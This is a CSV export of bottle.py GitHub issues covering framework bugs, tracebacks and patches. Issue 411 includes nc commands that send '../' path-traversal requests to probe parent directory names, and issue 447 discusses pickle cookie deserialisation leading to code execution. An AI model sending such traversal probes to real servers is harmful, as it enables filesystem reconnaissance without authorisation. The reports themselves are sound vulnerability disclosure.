ID,Title,Created At,Closed At,Issues,Errors,Messages,Body
457,bottle silently merges responses / bottle is not reentrant,2013-02-12T00:17:36Z,,,AssertionError,AssertionError: Content-Length is different from actual app_iter length (3!=8),"Running this code should reproduce

```
#!/usr/bin/env python

from webtest import TestApp
from bottle import Bottle

Alpha = Bottle()
Bravo = Bottle()

TestAlpha = TestApp(Alpha)
TestBravo = TestApp(Bravo)

@Alpha.route('/')
def route1():
    return '12345%s' % TestBravo.get('/').body

@Bravo.route('/')
def route2():
    return '123'

# This blows up with
# AssertionError: Content-Length is different from actual app_iter length (3!=8)
# because the content-length from route2's response (len=3) is reused for the
# response to route1.
def main():
    print 'Alpha says %s' % TestAlpha.get('/').body

if __name__ == '__main__':
    main()
```

Full Backtrace:

```
Traceback (most recent call last):
  File ""./bottle-response-bleed.py"", line 28, in <module>
    main()
  File ""./bottle-response-bleed.py"", line 25, in main
    print 'Alpha says %s' % TestAlpha.get('/').body
  File ""/home/mike/.virtualenvs/tmp/lib/python2.7/site-packages/webtest/app.py"", line 759, in get
    expect_errors=expect_errors)
  File ""/home/mike/.virtualenvs/tmp/lib/python2.7/site-packages/webtest/app.py"", line 1109, in do_request
    res.body
  File ""/home/mike/.virtualenvs/tmp/lib/python2.7/site-packages/webob/response.py"", line 361, in _body__get
    % (self.content_length, len(body))
AssertionError: Content-Length is different from actual app_iter length (3!=8)
```

```
WebOb==1.2.3
WebTest==1.4.3
bottle==0.11.6
```
"
456,Bottle cannot serve requests after a connection is forcibly closed .,2013-02-11T09:16:12Z,2013-02-11T15:54:51Z,,,,"I have web page that constantly pulls bottle server for updates (every second) .
All browsers are fine , but when access this page from IE(7,8,9) and i close IE's window ..
i get the following exception :

```
Exception happened during processing of request from ('127.0.0.1', 63166)
Traceback (most recent call last):
  File ""c:\python27\lib\SocketServer.py"", line 284, in _handle_request_noblock
    self.process_request(request, client_address)
  File ""c:\python27\lib\SocketServer.py"", line 310, in process_request
    self.finish_request(request, client_address)
  File ""c:\python27\lib\SocketServer.py"", line 323, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File ""c:\python27\lib\SocketServer.py"", line 638, in __init__
    self.handle()
  File ""c:\python27\lib\wsgiref\simple_server.py"", line 116, in handle
    self.raw_requestline = self.rfile.readline()
  File ""c:\python27\lib\socket.py"", line 447, in readline
    data = self._sock.recv(self._rbufsize)
error: [Errno 10054] An existing connection was forcibly closed by the remote host
```

After that the server cannot recover , and all further requests are failed until the service
is restarted ..  ( Sometimes though it recovers after a couple of minutes )

Tested on:
Windows(XP,7,8) , Python 2.7.3
Ubuntu 12.10 , Python 2.7.3
"
455,"hooks before_request and after_request are not called when route is not match, i.e when 404/405 status code is returned",2013-02-08T12:49:38Z,2013-06-21T18:37:57Z,Undecided,,,"I.e. I would like to log all incoming requests and responses. But when unknown method are requested 'route, args = self.router.match(environ)' raise HTTPError() and no any hooks are called.
"
454,mod_wsgi: Segmentation fault problem related with bottle,2013-02-06T09:56:04Z,2013-02-11T16:15:00Z,,,,"If i use ""import bottle"" in wsgi python application, than application fails with ""Segmentation fault"" error (httpd-errorlog) and creates a core file. 

platform: FreeBSD 8.3 stable
bottle version: py27-bottle-0.11.6
openssl version: OpenSSL 0.9.8q 2 
httpd -V
Server version: Apache/2.2.23 (FreeBSD)
Server built:   Feb  6 2013 10:10:01
Server's Module Magic Number: 20051115:31
Server loaded:  APR 1.4.6, APR-Util 1.4.1
Compiled using: APR 1.4.6, APR-Util 1.4.1
Architecture:   64-bit
Server MPM:     Prefork
  threaded:     no
    forked:     yes (variable process count)
Server compiled with....
 -D APACHE_MPM_DIR=""server/mpm/prefork""
 -D APR_HAS_SENDFILE
 -D APR_HAS_MMAP
 -D APR_HAVE_IPV6 (IPv4-mapped addresses disabled)
 -D APR_USE_FLOCK_SERIALIZE
 -D APR_USE_PTHREAD_SERIALIZE
 -D SINGLE_LISTEN_UNSERIALIZED_ACCEPT
 -D APR_HAS_OTHER_CHILD
 -D AP_HAVE_RELIABLE_PIPED_LOGS
 -D DYNAMIC_MODULE_LIMIT=128
 -D HTTPD_ROOT=""/usr/local""
 -D SUEXEC_BIN=""/usr/local/bin/suexec""
 -D DEFAULT_PIDLOG=""/var/run/httpd.pid""
 -D DEFAULT_SCOREBOARD=""logs/apache_runtime_status""
 -D DEFAULT_LOCKFILE=""/var/run/accept.lock""
 -D DEFAULT_ERRORLOG=""logs/error_log""
 -D AP_TYPES_CONFIG_FILE=""etc/apache22/mime.types""
 -D SERVER_CONFIG_FILE=""etc/apache22/httpd.conf""
# Details about core file:

```
(gdb) bt
#0  0x0000000803e0c2f0 in EVP_PKEY_CTX_dup () from /usr/local/lib/libcrypto.so.8
#1  0x0000000803dffa4f in EVP_MD_CTX_copy_ex () from /usr/local/lib/libcrypto.so.8
#2  0x0000000807309f26 in EVPnew () from /usr/local/lib/python2.7/lib-dynload/_hashlib.so
#3  0x000000080730a250 in EVP_new_md5 () from /usr/local/lib/python2.7/lib-dynload/_hashlib.so
#4  0x0000000805347c52 in PyEval_EvalFrameEx () from /usr/local/lib/libpython2.7.so
#5  0x0000000805349013 in PyEval_EvalFrameEx () from /usr/local/lib/libpython2.7.so
#6  0x00000008053498a5 in PyEval_EvalCodeEx () from /usr/local/lib/libpython2.7.so
#7  0x00000008053499a2 in PyEval_EvalCode () from /usr/local/lib/libpython2.7.so
#8  0x00000008053588e2 in PyImport_ExecCodeModuleEx () from /usr/local/lib/libpython2.7.so
#9  0x0000000805358ec0 in PyImport_ImportFrozenModule () from /usr/local/lib/libpython2.7.so
#10 0x0000000805359fa9 in PyImport_ReloadModule () from /usr/local/lib/libpython2.7.so
#11 0x000000080535a480 in PyImport_ReloadModule () from /usr/local/lib/libpython2.7.so
#12 0x000000080535b078 in PyImport_ImportModuleLevel () from /usr/local/lib/libpython2.7.so
#13 0x0000000805341d1d in _PyBuiltin_Init () from /usr/local/lib/libpython2.7.so
#14 0x00000008052b1a98 in PyObject_Call () from /usr/local/lib/libpython2.7.so
#15 0x0000000805342246 in PyEval_CallObjectWithKeywords () from /usr/local/lib/libpython2.7.so
#16 0x0000000805344d4d in PyEval_EvalFrameEx () from /usr/local/lib/libpython2.7.so
#17 0x00000008053498a5 in PyEval_EvalCodeEx () from /usr/local/lib/libpython2.7.so
#18 0x00000008053499a2 in PyEval_EvalCode () from /usr/local/lib/libpython2.7.so
#19 0x00000008053588e2 in PyImport_ExecCodeModuleEx () from /usr/local/lib/libpython2.7.so
#20 0x0000000805358ec0 in PyImport_ImportFrozenModule () from /usr/local/lib/libpython2.7.so
#21 0x0000000805359fa9 in PyImport_ReloadModule () from /usr/local/lib/libpython2.7.so
#22 0x000000080535a480 in PyImport_ReloadModule () from /usr/local/lib/libpython2.7.so
#23 0x000000080535b078 in PyImport_ImportModuleLevel () from /usr/local/lib/libpython2.7.so
#24 0x0000000805341d1d in _PyBuiltin_Init () from /usr/local/lib/libpython2.7.so
#25 0x00000008052b1a98 in PyObject_Call () from /usr/local/lib/libpython2.7.so
#26 0x0000000805342246 in PyEval_CallObjectWithKeywords () from /usr/local/lib/libpython2.7.so
#27 0x0000000805344d4d in PyEval_EvalFrameEx () from /usr/local/lib/libpython2.7.so
---Type <return> to continue, or q <return> to quit---
#28 0x00000008053498a5 in PyEval_EvalCodeEx () from /usr/local/lib/libpython2.7.so
#29 0x00000008053499a2 in PyEval_EvalCode () from /usr/local/lib/libpython2.7.so
#30 0x00000008053588e2 in PyImport_ExecCodeModuleEx () from /usr/local/lib/libpython2.7.so
#31 0x0000000805358ec0 in PyImport_ImportFrozenModule () from /usr/local/lib/libpython2.7.so
#32 0x0000000805359fa9 in PyImport_ReloadModule () from /usr/local/lib/libpython2.7.so
#33 0x000000080535a480 in PyImport_ReloadModule () from /usr/local/lib/libpython2.7.so
#34 0x000000080535b078 in PyImport_ImportModuleLevel () from /usr/local/lib/libpython2.7.so
#35 0x0000000805341d1d in _PyBuiltin_Init () from /usr/local/lib/libpython2.7.so
#36 0x00000008052b1a98 in PyObject_Call () from /usr/local/lib/libpython2.7.so
#37 0x0000000805342246 in PyEval_CallObjectWithKeywords () from /usr/local/lib/libpython2.7.so
#38 0x0000000805344d4d in PyEval_EvalFrameEx () from /usr/local/lib/libpython2.7.so
#39 0x00000008053498a5 in PyEval_EvalCodeEx () from /usr/local/lib/libpython2.7.so
#40 0x00000008053499a2 in PyEval_EvalCode () from /usr/local/lib/libpython2.7.so
#41 0x00000008053588e2 in PyImport_ExecCodeModuleEx () from /usr/local/lib/libpython2.7.so
#42 0x0000000805358ec0 in PyImport_ImportFrozenModule () from /usr/local/lib/libpython2.7.so
#43 0x0000000805359fa9 in PyImport_ReloadModule () from /usr/local/lib/libpython2.7.so
#44 0x000000080535a480 in PyImport_ReloadModule () from /usr/local/lib/libpython2.7.so
#45 0x000000080535b078 in PyImport_ImportModuleLevel () from /usr/local/lib/libpython2.7.so
#46 0x0000000805341d1d in _PyBuiltin_Init () from /usr/local/lib/libpython2.7.so
#47 0x00000008052b1a98 in PyObject_Call () from /usr/local/lib/libpython2.7.so
#48 0x0000000805342246 in PyEval_CallObjectWithKeywords () from /usr/local/lib/libpython2.7.so
#49 0x0000000805344d4d in PyEval_EvalFrameEx () from /usr/local/lib/libpython2.7.so
#50 0x00000008053498a5 in PyEval_EvalCodeEx () from /usr/local/lib/libpython2.7.so
#51 0x00000008053499a2 in PyEval_EvalCode () from /usr/local/lib/libpython2.7.so
#52 0x00000008053588e2 in PyImport_ExecCodeModuleEx () from /usr/local/lib/libpython2.7.so
#53 0x0000000805358ec0 in PyImport_ImportFrozenModule () from /usr/local/lib/libpython2.7.so
#54 0x0000000805359fa9 in PyImport_ReloadModule () from /usr/local/lib/libpython2.7.so
#55 0x000000080535a480 in PyImport_ReloadModule () from /usr/local/lib/libpython2.7.so
---Type <return> to continue, or q <return> to quit---
#56 0x000000080535b078 in PyImport_ImportModuleLevel () from /usr/local/lib/libpython2.7.so
#57 0x0000000805341d1d in _PyBuiltin_Init () from /usr/local/lib/libpython2.7.so
#58 0x00000008052b1a98 in PyObject_Call () from /usr/local/lib/libpython2.7.so
#59 0x0000000805342246 in PyEval_CallObjectWithKeywords () from /usr/local/lib/libpython2.7.so
#60 0x0000000805344d4d in PyEval_EvalFrameEx () from /usr/local/lib/libpython2.7.so
#61 0x00000008053498a5 in PyEval_EvalCodeEx () from /usr/local/lib/libpython2.7.so
#62 0x00000008053499a2 in PyEval_EvalCode () from /usr/local/lib/libpython2.7.so
#63 0x00000008053588e2 in PyImport_ExecCodeModuleEx () from /usr/local/lib/libpython2.7.so
#64 0x0000000805358ec0 in PyImport_ImportFrozenModule () from /usr/local/lib/libpython2.7.so
#65 0x0000000805359fa9 in PyImport_ReloadModule () from /usr/local/lib/libpython2.7.so
#66 0x000000080535a480 in PyImport_ReloadModule () from /usr/local/lib/libpython2.7.so
#67 0x000000080535b078 in PyImport_ImportModuleLevel () from /usr/local/lib/libpython2.7.so
#68 0x0000000805341d1d in _PyBuiltin_Init () from /usr/local/lib/libpython2.7.so
#69 0x00000008052b1a98 in PyObject_Call () from /usr/local/lib/libpython2.7.so
#70 0x0000000805342246 in PyEval_CallObjectWithKeywords () from /usr/local/lib/libpython2.7.so
#71 0x0000000805344d4d in PyEval_EvalFrameEx () from /usr/local/lib/libpython2.7.so
#72 0x00000008053498a5 in PyEval_EvalCodeEx () from /usr/local/lib/libpython2.7.so
#73 0x00000008053499a2 in PyEval_EvalCode () from /usr/local/lib/libpython2.7.so
#74 0x00000008053588e2 in PyImport_ExecCodeModuleEx () from /usr/local/lib/libpython2.7.so
#75 0x0000000805154b39 in wsgi_load_source (pool=0x80175d028, r=0x80175d0a0, name=0x80175f5f0 ""_mod_wsgi_e93ce327bcb956f5b8088e28e282797d"", exists=Variable ""exists""                               is not available.
)
    at mod_wsgi.c:6402
#76 0x000000080515882e in wsgi_execute_script (r=0x80175d0a0) at mod_wsgi.c:6759
#77 0x000000080515c315 in wsgi_process_socket (p=Variable ""p"" is not available.
) at mod_wsgi.c:13567
#78 0x000000080515c794 in wsgi_daemon_thread (thd=0x80169eda0, data=Variable ""data"" is not available.
) at mod_wsgi.c:10993
#79 0x00000008012924f1 in pthread_getprio () from /lib/libthr.so.3
#80 0x0000000000000000 in ?? ()
Cannot access memory at address 0x7fffff7fd000
```

how can i solve it?
"
453,TypeError when using Cython,2013-02-06T09:07:29Z,2013-02-11T16:18:22Z,,TypeError,TypeError: server_static() takes no keyword arguments,"Hi , i am using Cython to write my bottle based application .
inside my application i serve static files like this :

@controller.route('/Apps/filepath:path')
def server_static(filepath):
    return static_file(filepath,root='%s/Apps' %myPath)

When i run this code as Python code , static files being served as intended ,
but when i compile my project to Cython code , and try to access a static file 
i get following error : 

Traceback (most recent call last):
  File ""/usr/local/lib/python2.7/dist-packages/bottle.py"", line 763, in _handle
    return route.call(*_args)
  File ""/usr/local/lib/python2.7/dist-packages/bottle.py"", line 1572, in wrapper
    rv = callback(_a, **ka)
TypeError: server_static() takes no keyword arguments

Note : i am compiling only my modules to Cython , Bottle module is not touched .
Also everything else works as it should .. only accessing static files rises the exception.

Python 2.7 Linux , Bottle 11.4 , Cython 0.16
"
452,DELETE before GET obscures route,2013-02-06T00:33:05Z,2017-07-17T23:25:27Z,"Bug, Undecided",,,"I came across an issue with 0.11.6 where listing a route with a DELETE before a route with a GET obscures the GET path and you can't get to it, ending up with a 405.  I will paste the code below.  The only path that doesn't work is where the DELETE and GET routes are the same.
"
451,docs/recipes.rst: ``before_request`` fixed,2013-02-05T12:02:06Z,2013-02-11T16:27:58Z,,,,"fixed `before_callback` to `before_request` in docs/recipes.rst
"
450,URL encoded characters affect route,2013-02-05T05:32:24Z,2013-02-05T15:58:38Z,,,,"I don't know if this is standard behaviour, but it seems very strange to me:

```
http://127.0.0.1:8080/test/foo%2Fbar
```

I've defined a route for `/test/:x`, but I receive the error:

```
Not found: '/test/foo/bar'
```

The fact that the slash character is decoded and used in route determination seems like incorrect behaviour.
"
449,Fix for silent truncation during post (re: pull #399),2013-02-03T19:05:06Z,2013-02-11T18:40:56Z,,,,"Fix for situations where content is larger than memory, we should not truncate but give a 413 error.
https://github.com/defnull/bottle/pull/399
"
448,Possible (arguably safer) alternative to pickle for cookie serialisation,2013-02-03T17:41:31Z,2013-02-11T16:37:38Z,,,,"Addresses issue #447.
"
447,Possibly unsafe use of pickle(),2013-02-03T16:57:29Z,2016-05-24T21:08:04Z,Bug,,,"I've come across http://vudang.com/2013/01/python-web-framework-from-lfr-to-rce/, which outlines a possible exploit in default bottle.py cookie handling. 

Perhaps using json.dumps() and reads() would be enough here? AFAIK the JSON decoder does not share this vulnerability.
"
446,Fix content-type header in mounted apps.,2013-02-01T18:42:48Z,2013-02-01T18:50:39Z,,,,"The fix in 0.11.5 to update the mountpoint_wrapper introduced a bug where ""Content-Type: text/html; charset=UTF-8"" is added in all my responses even though I'm only sending json and already set the appropriate header. Changing it back fixes the problem.
"
445,MEMFILE_MAX doesn't work in 0.11.4,2013-01-31T15:51:27Z,2013-02-11T16:31:52Z,,,,"MEMFILE_MAX doesn't work in 0.11.4 but in 0.10.11 works
"
444,@never_cache decorator,2013-01-27T09:06:24Z,2013-01-31T01:26:35Z,,,,"I built API based on bottle,  communicate with flash client.

I found that It's more convenient  using a decorator to set no-cache than  write
`response.set_header` in all GET method functions.

So, I added the `never_cache` decorator, and tests

```
from bottle import never_cache

@app.get('PATH')
@never_cache
def my_func():
    return 'hello'
```
"
443,"README, add lazier install, re #442",2013-01-27T00:48:20Z,2013-02-11T16:44:33Z,,,,
442,"Git tag/branch for 'release' or such, or easy curling",2013-01-27T00:33:45Z,2013-02-11T16:43:53Z,,,,"In README and other docs, it would be nice to see a stable one-line installer for the truly lazy:

```
curl https://raw.github.com/defnull/bottle/release/bottle.py -o bottle.py
```

For that to happen, there needs to be a tag/branch for 'release'.  
"
441,Start Bottle.app with Tornado server.,2013-01-25T00:17:22Z,2013-01-25T21:59:49Z,,,,"I have next config on my server:
nginx(listen port 80) >> tornado(listen 8888 port) >> bottleapp.
When tornado server started, default host(address) is """", and he listen all possible hostnames('localhost"", ip on local network, ect) on port 8888
Wee can  go at our site like example.com/  and example.com:8888/ . It's not safe.
"
440,Add a submit button to HTML file-upload form,2013-01-23T03:35:23Z,2013-02-11T16:49:19Z,,,,"It's helpful for newbies.
"
439,"ResourceManager for static files (e.g. css, jss)?",2013-01-20T09:18:15Z,,,,,"Hey, I just got started with bottlepy and am looking for a way to provide static files, such as bootstrap.css or jQuery. I did find a way with static_file and app.get_url. Though I am just curious, would it be possible to do the same thing with ResourceManager as well?
There is not much documentation on it and I couldn't really find any examples.
It would be great if there would be some example for that (if it is for what I think it is).
"
438,Some cookies are lost when using mount(),2013-01-19T10:55:48Z,2013-01-21T12:26:28Z,,,,"I'm mounting some routes through app.mount(), and it looks like that only one cookies of all the cookies I have set are sent to the browser. I think the issue is somewhere here in bottle.py v11.4:

```
    def mountpoint_wrapper():
        try:
            request.path_shift(path_depth)
            rs = BaseResponse([], 200)
            def start_response(status, header):
                rs.status = status
                for name, value in header: rs.add_header(name, value)
                return rs.body.append
            body = app(request.environ, start_response)
            body = itertools.chain(rs.body, body)
            return HTTPResponse(body, rs.status_code, **rs.headers)
        finally:
            request.path_shift(-path_depth)
```

At least, rs.headers.dict contains all cookies, but the variable headers in HTTPResponse doesn't contain any.

Could it because **getitem** of HeaderDict returns the last item instead of all items ?
"
437,Server adapters does not accept kwargs,2013-01-15T13:02:19Z,,,,,"`bottle.run` has `**kwargs` but and send it to server adapters, but all adapters does not accept `**kwargs`. Some of these adapters probably can accept custom configuration.

It is related with #436.
"
436,SSL support with gevent server,2013-01-15T08:43:45Z,2013-01-15T13:56:09Z,,,,"As of version 0.13.8, gevent's support of SSL connection seems working fine.
Nonetheless, bottle still states GeventServer has no SSL support.

Here comes a gevent class that support SSL.

``` python
class SecureGeventServer(ServerAdapter):
    def run(self, handler):
        from gevent import wsgi, pywsgi, local
        import threading
        _lcth = threading.local()
        if not isinstance(_lcth, local.local):
            msg = ""Bottle requires gevent.monkey.patch_all() (before import)""
            raise RuntimeError(msg)
        if not self.options.get('fast'): wsgi = pywsgi
        log = None if self.quiet else 'default'
        wsgi.WSGIServer((self.host, self.port), handler, log=log, keyfile='server.key', certfile='server.crt').serve_forever()

app = Bottle()

port = int(os.environ.get(""PORT"", 443))
run(app=app, host='0.0.0.0', port=port, server=SecureGeventServer)
```

It works fine with me but I have no idea how well it will work in different environments. 

It is deployed with
Python : 2.7.3
Gevent : 0.13.8
Bottle : 0.11.2

Looking forward to hearing from you.
"
435,Removing `method` keyword before non-keyword,2013-01-14T13:37:31Z,2013-01-14T16:59:10Z,,,,"It was reported here: https://twitter.com/markessien/status/290117732450574337
"
434,"New doc section about adding authentication, and 2 small fixes",2013-01-12T21:48:40Z,,,,,"Small fixes look ok to me, but perhaps the ':doc:' means something else?
"
433,Small fix to makelist regarding empty strings,2013-01-07T16:44:39Z,2013-02-11T16:52:16Z,,,,"Currently, makelist returns an empty list when given an empty string. Fixed to return a list contatining the empty list.
"
432,Proposal WRT function 'code' in class 'SimpleTemplate': without 'repr',2013-01-06T02:09:44Z,2013-02-11T16:57:18Z,,,,"I (would) like to use %include in such a manner that I can determine the filename as a parameter in the calling template-function:

<pre>
bottle.template('views/base.tpl', to_be_included = 'views/text_de.tpl')
</pre>

and in the template 'base.tpl':

<pre>
...
%include to_be_included
...
</pre>

so that I can build different websites starting from the same base.tpl, but with different included templates.
To reach that, one could very slightly modify the function 'code' in the class 'SimpleTemplate', namely delete the repr()-call in the following segment:

<pre>
                    if len(p) == 2:
                        code(""_=_include(%s, _stdout, %s)"" % (repr(p[0]), p[1]))
                    elif p:
                        code(""_=_include(%s, _stdout)"" % repr(p[0]))
</pre>

Thus, I would have the choice, if I write

<pre>
%include 'path'
</pre>

or

<pre>
%include path
</pre>

In the first case, I determine the path in the template, in the second case, I determine the path in my python-code.
I tried it - with other path names - and it worked. But maybe I simply do not see the deciding advantages of the repr()-call -- so excuse my long question, please!
By the way: I like Bottle very much; it is simply great (and in this sentence one can emphasize both 'simply' and 'great').
"
431,self.quiet should not stop messages to logging,2013-01-04T22:35:33Z,2013-01-21T12:52:36Z,,,,"As per. the documentation:
""quiet: Suppress output to stdout and stderr? (default: False)""
Before this patch self.quiet also suppressed log messages to the 'wsgi' logger.
"
430,Update docs/tutorial_app.rst,2013-01-04T01:00:09Z,,,,,"fixed line 154 typo: quiet -> quite
"
429,mount() not working,2013-01-01T23:07:57Z,2013-01-02T23:23:53Z,,,,"I'm following the docs and trying to mount a sub app but this code fails to resolve the mounted app paths (v0.12-dev)

```
from gevent import monkey;monkey.patch_all()
import bottle

app = bottle.Bottle()
@app.route('/')
def home():
    pass

subapp = bottle.Bottle()
@subapp.route('/test')   #I'm getting 404 error here
def test():
    pass

app.mount(subapp, '/test')

if __name__ == '__main__':
    bottle.run(app=app, host='0.0.0.0', port='80', server='gevent')
```
"
428,"request.forms.get(""file"") with form with type=""file"" does not work",2012-12-26T11:54:31Z,,,,,"With form with:

<form method=""POST"" action=""/sources"">
        ${loc('File')}: <input name=""addsource"" type=""file""/>
                        <input type=""reset"" value=""${loc('Reset')}""/>
                        <input type=""submit"" value=""${loc('OK')}""/>
     </form>


The addedsource = request.forms.get('addsource') return **only** the name of the file not the whole path itself. With type=""text"", I get it.

By the other hand, request.files.get does not work for me.

Thanks in advance,
Xan.
"
427,typo,2012-12-24T14:39:12Z,2012-12-24T15:41:24Z,,,,
426,Cherrypy Adapter does not work on Ubuntu 12.04 LTS,2012-12-20T11:22:58Z,,,,,"When running Bottle (0.11.4) with the Cherrypy server adapter unter Ubuntu 12.04, the server fails to start with an import error, as the WSGI Server from Cherrypy can't be loaded.

When I type ""import cherrypy;dir(cherrypy)"" I indeed do not see any WSGI modul / class...

Cherrypy version is the one from the Ubuntu repositires, 2.3.0.
"
425,Support HTTP PATCH method as per RFC #5789,2012-12-18T11:45:05Z,2014-04-13T21:08:56Z,,,,"This would be nice to have built-in as a @patch decorator.
"
424,Don't follow links,2012-12-17T16:37:16Z,2012-12-19T19:17:01Z,,,,"Hi,

if in bottle, you add an absolute uri like this:

```
<a href=""file:///home/xan/proves/github/quatrilio@github.com/xi/test/test.txt"">A</a>
```

Then firefox does not follow the link.

I suspect this is because static file behaviour. Can you confirm that and change this allowing firefox to follow link.

Thanks in advance,
Xan.
"
423,Expose Jinaj2 globals directive,2012-12-17T13:16:17Z,2013-12-04T09:39:13Z,,,,"This patch exposes the 'globals' directive for the Jinja2 wrapper.
"
422,Trying to understand #396,2012-12-15T21:19:23Z,2012-12-16T13:53:07Z,,,,"I don't know if it should be merged, I'm just trying to understand the `auth_basic` don't sending the headers (#396). The test works, but the header is title case `Www-Authenticate`.
"
421,bug in calculation with results under 1? ,2012-12-15T00:54:09Z,2012-12-15T03:12:59Z,,ZeroDivisionError,ZeroDivisionError: integer division or modulo by zero,"print(9/10)
0
print(float(9/10))
0.0

normal python interpreter:
print(9/10)
0.9
also every calculator.

in turn of this my app crashes with this error:
ZeroDivisionError: integer division or modulo by zero

something is wrong with bottle.
"
420,Support Dojo jsonREST GET request?,2012-12-14T12:08:01Z,,,,,"Dojo's ""dojo/store/JsonRest"" module will send RESTful get requests that look like:

OPTIONS /myapp/getData HTTP/1.1
Host: localhost:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:10.0.11) Gecko/20121121 Firefox/10.0.11
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,_/_;q=0.8
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Origin: http://localhost
Access-Control-Request-Method: GET
Access-Control-Request-Headers: x-requested-with

Bottle does not seem to recognize this as a GET request. 
"
419,How do I force certain HTTP headers in all responses?,2012-12-14T11:32:55Z,2012-12-14T12:02:17Z,,,,"I have tried:

``` python
from bottle import Response

Response(headers={""X-Frame-Options"": ""sameorigin"", ""X-XSS-Protection"": ""1; mode=block""})

[...]

@get(""/session/new"")
def session_new():
    """"""
    Create new session token
    """"""
    global session_ids
    session_id = hexencode(os.urandom(32))
    session_ids.append(session_id)
    response.content_type = ""application/json; charset=UTF-8""
    return {""sessionid"": session_id}
```

But the HTTP response has not the two headers I expect (`X-Frame-Options` and `X-XSS-Protection`):

```
HTTP/1.0 200 OK
Date: Fri, 14 Dec 2012 10:57:19 GMT
Server: WSGIServer/0.1 Python/2.7.3
Content-Length: 81
Content-Type: application/json; charset=UTF-8

{""sessionid"": ""226a6cfe02d8c64c480fbb5176c5e56a1385d71ba18fc6f938ae658516b82ba7""}
```

I am using latest development version of bottle.py from the GitHub repository (36d84c0a5005ce25a6abca5038ea7a4505279934).

On a side note, is it possible to customize the Server header value across all responses too?
I am setting the content_type to application/json function by function, would you recommend setting it globally too? I am developing a REST-JSON API.

Thank you.
Bernardo
"
418,relative import does not work when using reloader,2012-12-07T05:48:49Z,,,ValueError,ValueError: Attempted relative import in non-package,"structure:

```
pkg
  + __init__.py
  + main.py
  + util.py
```

FILE: pkg.main.py

``` python
from .util import * # this line will raise a ValueError
if __name__ == '__main__':
    run(..., reload=True)
```

``` sh
[~]$ python -m pkg.main
ValueError: Attempted relative import in non-package
```

The relative import will be fail because `__package__` is not set.
bottle version: 0.11.4
"
417,Update HTTPResponse call when mounting apps,2012-12-05T17:28:06Z,2012-12-06T13:04:48Z,,,,"Applying it to release 0.11 to remove the warning described in #395. I'm not sure if this is the right way to do it (duplicating pull requests to make it to 0.11 branch and to master).
"
416,Update HTTPResponse call when mounting apps,2012-12-05T17:16:02Z,2012-12-06T13:03:14Z,,,,"It solves #395 and should be applied to v0.11 branch too.
"
415,Typo in test_resources.py,2012-12-05T16:48:58Z,2012-12-06T13:02:22Z,,,,
414,Feature to detect when a client closed a long-running connection,2012-12-03T06:45:34Z,2012-12-03T17:18:54Z,,,,"I have a threaded EventSource-style request handler that runs forever and keeps sending data with yield. I'd like to detect when the client has closed the HTTP connection so I can exit the loop, otherwise I keep piling up threads.

Is there something in bottle in the request or response object that I can query to find out if the connection is still open, or is there a socket close callback that I can register? I'm currently using the Rocket server, perhaps it has something that can be queried, and I can get a reference to the underlying rocket handler instance?
"
413,Use Python syntax highlighting in the readme file,2012-12-01T20:02:17Z,2013-01-21T12:55:04Z,,,,
412,Using ANY instead of ALL,2012-12-01T12:58:24Z,2012-12-01T14:06:40Z,,,,"Just solving #409.
"
411,static_file / :path filter insecure - disclosure parent folder names,2012-12-01T08:27:17Z,,,,,"We can use ""../some_guess"" in request, to check if the parent folder on the filesystem is named ""some_guess"".

Source:

``` python
from bottle import *

@route('/static/<filepath:path>')
def server_static(filepath):
    return static_file(filepath, root=""/tmp"")

run(host='localhost', port=3123)
```

Start server:

``` bash
/tmp $ python web.py 
Bottle v0.12-dev server starting up (using WSGIRefServer())...
Listening on http://localhost:3123/
Hit Ctrl-C to quit.

```

Example requests:

``` bash
/tmp $ echo -en 'GET /static/../some_test/web.py HTTP/1.1\r\n\r\n' | nc 127.0.0.1 3123
HTTP/1.0 403 Forbidden
...

$ echo -en 'GET /static/../tmp/web.py HTTP/1.1\r\n\r\n' | nc 127.0.0.1 3123
HTTP/1.0 200 OK
<source goes here>
```

So, we can distinguish valid and invalid guesses. Not crucial, but not good 
"
